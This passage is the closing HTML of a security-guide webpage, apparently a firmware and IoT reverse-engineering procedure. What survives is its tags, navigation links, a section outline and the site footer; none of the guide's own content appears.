</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-tags-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/sop">sop</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/firmware">firmware</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/iot">iot</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/embedded">embedded</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/reverse-engineering">reverse-engineering</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/hardware">hardware</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/intel-codex/tags/router">router</a></li></ul></div></div><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/intel-codex/Security/Pentesting/sop-detection-evasion-testing"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Detection &amp; Evasion Testing SOP (Purple Team)</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/intel-codex/Security/Pentesting/sop-linux-pentest"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Linux Pentesting SOP (Authorized)</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#table-of-contents" class="table-of-contents__link toc-highlight">Table of Contents</a></li><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a><ul><li><a href="#what-is-firmware" class="table-of-contents__link toc-highlight">What is Firmware?</a></li><li><a href="#why-reverse-firmware" class="table-of-contents__link toc-highlight">Why Reverse Firmware?</a></li><li><a href="#threat-model" class="table-of-contents__link toc-highlight">Threat Model</a></li><li><a href="#legal--ethical-considerations" class="table-of-contents__link toc-highlight">Legal &amp; Ethical Considerations</a></li></ul></li><li><a href="#firmware-acquisition" class="table-of-contents__link toc-highlight">Firmware Acquisition</a><ul><li><a href="#method-1-download-from-vendor-website" class="table-of-contents__link toc-highlight">Method 1: Download from Vendor Website</a></li><li><a href="#method-2-intercept-firmware-update" class="table-of-contents__link toc-highlight">Method 2: Intercept Firmware Update</a></li><li><a href="#method-3-extract-from-flash-memory-hardware" class="table-of-contents__link toc-highlight">Method 3: Extract from Flash Memory (Hardware)</a></li><li><a href="#method-4-uartserial-console-extraction" class="table-of-contents__link toc-highlight">Method 4: UART/Serial Console Extraction</a></li></ul></li><li><a href="#firmware-analysis" class="table-of-contents__link toc-highlight">Firmware Analysis</a><ul><li><a href="#initial-triage" class="table-of-contents__link toc-highlight">Initial Triage</a></li><li><a href="#firmware-unpacking" class="table-of-contents__link toc-highlight">Firmware Unpacking</a></li></ul></li><li><a href="#filesystem-extraction" class="table-of-contents__link toc-highlight">Filesystem Extraction</a><ul><li><a href="#analyzing-extracted-filesystem" class="table-of-contents__link toc-highlight">Analyzing Extracted Filesystem</a></li><li><a href="#searching-for-sensitive-information" class="table-of-contents__link toc-highlight">Searching for Sensitive Information</a></li><li><a href="#web-application-files" class="table-of-contents__link toc-highlight">Web Application Files</a></li></ul></li><li><a href="#binary-analysis" class="table-of-contents__link toc-highlight">Binary Analysis</a><ul><li><a href="#analyzing-embedded-binaries" class="table-of-contents__link toc-highlight">Analyzing Embedded Binaries</a></li><li><a href="#cross-compilation-for-testing" class="table-of-contents__link toc-highlight">Cross-Compilation for Testing</a></li></ul></li><li><a href="#hardware-interfaces" class="table-of-contents__link toc-highlight">Hardware Interfaces</a><ul><li><a href="#uart-universal-asynchronous-receivertransmitter" class="table-of-contents__link toc-highlight">UART (Universal Asynchronous Receiver/Transmitter)</a></li><li><a href="#jtag-joint-test-action-group" class="table-of-contents__link toc-highlight">JTAG (Joint Test Action Group)</a></li><li><a href="#spi-serial-peripheral-interface" class="table-of-contents__link toc-highlight">SPI (Serial Peripheral Interface)</a></li></ul></li><li><a href="#emulation--dynamic-analysis" class="table-of-contents__link toc-highlight">Emulation &amp; Dynamic Analysis</a><ul><li><a href="#qemu-user-mode-emulation" class="table-of-contents__link toc-highlight">QEMU User-Mode Emulation</a></li><li><a href="#qemu-system-emulation" class="table-of-contents__link toc-highlight">QEMU System Emulation</a></li><li><a href="#firmadyne-automated-firmware-emulation" class="table-of-contents__link toc-highlight">Firmadyne (Automated Firmware Emulation)</a></li><li><a href="#fat-firmware-analysis-toolkit" class="table-of-contents__link toc-highlight">FAT (Firmware Analysis Toolkit)</a></li></ul></li><li><a href="#common-vulnerabilities" class="table-of-contents__link toc-highlight">Common Vulnerabilities</a><ul><li><a href="#authentication-bypass" class="table-of-contents__link toc-highlight">Authentication Bypass</a></li><li><a href="#command-injection" class="table-of-contents__link toc-highlight">Command Injection</a></li><li><a href="#buffer-overflows" class="table-of-contents__link toc-highlight">Buffer Overflows</a></li><li><a href="#insecure-firmware-updates" class="table-of-contents__link toc-highlight">Insecure Firmware Updates</a></li><li><a href="#weak-cryptography" class="table-of-contents__link toc-highlight">Weak Cryptography</a></li></ul></li><li><a href="#exploitation-techniques" class="table-of-contents__link toc-highlight">Exploitation Techniques</a><ul><li><a href="#gaining-shell-access" class="table-of-contents__link toc-highlight">Gaining Shell Access</a></li><li><a href="#persistence-mechanisms" class="table-of-contents__link toc-highlight">Persistence Mechanisms</a></li><li><a href="#post-exploitation" class="table-of-contents__link toc-highlight">Post-Exploitation</a></li></ul></li><li><a href="#tools-reference" class="table-of-contents__link toc-highlight">Tools Reference</a><ul><li><a href="#firmware-analysis-tools" class="table-of-contents__link toc-highlight">Firmware Analysis Tools</a></li><li><a href="#hardware-tools" class="table-of-contents__link toc-highlight">Hardware Tools</a></li><li><a href="#emulation--debugging" class="table-of-contents__link toc-highlight">Emulation &amp; Debugging</a></li><li><a href="#binary-analysis-1" class="table-of-contents__link toc-highlight">Binary Analysis</a></li><li><a href="#exploitation" class="table-of-contents__link toc-highlight">Exploitation</a></li><li><a href="#utilities" class="table-of-contents__link toc-highlight">Utilities</a></li></ul></li><li><a href="#practical-workflows" class="table-of-contents__link toc-highlight">Practical Workflows</a><ul><li><a href="#workflow-1-router-firmware-analysis" class="table-of-contents__link toc-highlight">Workflow 1: Router Firmware Analysis</a></li><li><a href="#workflow-2-iot-camera-firmware-extraction" class="table-of-contents__link toc-highlight">Workflow 2: IoT Camera Firmware Extraction</a></li><li><a href="#workflow-3-smart-thermostat-privilege-escalation" class="table-of-contents__link toc-highlight">Workflow 3: Smart Thermostat Privilege Escalation</a></li></ul></li><li><a href="#learning-resources" class="table-of-contents__link toc-highlight">Learning Resources</a><ul><li><a href="#documentation" class="table-of-contents__link toc-highlight">Documentation</a></li><li><a href="#books" class="table-of-contents__link toc-highlight">Books</a></li><li><a href="#online-courses" class="table-of-contents__link toc-highlight">Online Courses</a></li><li><a href="#practice-labs" class="table-of-contents__link toc-highlight">Practice Labs</a></li></ul></li><li><a href="#related-sops" class="table-of-contents__link toc-highlight">Related SOPs</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Intel Codex</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="Intel Codex overview page" href="/intel-codex">Overview</a></li><li class="footer__item"><a href="https://github.com/gl0bal01/intel-codex" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Download the Intel Codex Obsidian vault">Download Vault<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">OSINT Investigations</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="OSINT investigation index" href="/intel-codex/Investigations/Investigations-Index">Investigation Index</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Investigation techniques and methodologies" href="/intel-codex/Investigations/Techniques/Techniques-Index">Investigation Techniques</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Platform-specific investigation guides" href="/intel-codex/Investigations/Platforms/Platforms-Index">Platform Guides</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Security Operations</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="Security analysis resources and guides" href="/intel-codex/Security/Analysis/Analysis-Index">Security Analysis</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Penetration testing methodologies and tools" href="/intel-codex/Security/Pentesting/Pentesting-Index">Penetration Testing</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Malware analysis procedures" href="/intel-codex/Security/Analysis/sop-malware-analysis">Malware Analysis</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Reverse engineering techniques" href="/intel-codex/Security/Analysis/sop-reverse-engineering">Reverse Engineering</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Digital forensics investigation procedures" href="/intel-codex/Security/Analysis/sop-forensics-investigation">Digital Forensics (DFIR)</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Resources</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="OSINT foundations and resources" href="/osint">OSINT Foundations</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Cybersecurity resources and guides" href="/cyber">Cybersecurity</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Artificial intelligence resources" href="/ai">AI Resources</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Technical cheatsheets and quick references" href="/cheatsheets">Cheatsheets</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Security and technology news feeds" href="/news">News Feeds</a></li><li class="footer__item"><a class="footer__link-item" aria-label="Visit our blog" href="/blog">Blog</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" aria-label="CTF platforms and training resources" href="/blog/ctf-platforms-training">Play &amp; Learn</a></li><li class="footer__item"><a href="https://github.com/gl0bal01/" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Visit gl0bal01 on GitHub">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discord.gg/T5tc9Rq8DV" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Join gl0bal01 Discord community">Discord<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://start.me/u/gl0bal01" target="_blank" rel="noopener noreferrer" class="footer__link-item" aria-label="Visit gl0bal01 Start.me page">Start.me<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 gl0bal01. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>